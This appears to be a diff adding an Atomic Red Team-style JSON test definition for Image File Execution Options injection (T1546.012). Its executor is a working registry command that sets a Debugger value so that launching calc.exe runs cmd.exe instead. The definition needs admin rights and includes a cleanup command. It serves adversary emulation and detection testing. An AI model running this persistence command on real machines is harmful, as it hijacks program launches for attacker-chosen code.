@@ -1,0 +1,37 @@
+{
+    "name": "IFEO Add Debugger",
+    "description": "Leverage Global Flags Settings ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\"\n",
+        "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /f >nul 2>&1\n",
+        "name": "command_prompt",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1546.012",
+    "tactics": [
+        "Persistence",
+        "Privilege Escalation"
+    ],
+    "technique": "Image File Execution Options Injection",
+    "source": "ART",
+    "uuid": "fdda2626-5234-4c90-b163-60849a24c0b8",
+    "arguments": {
+        "target_binary": {
+            "description": "Binary To Attach To",
+            "type": "path",
+            "default": "calc.exe"
+        },
+        "payload_binary": {
+            "description": "Binary To Execute",
+            "type": "path",
+            "default": "C:\\Windows\\System32\\cmd.exe"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
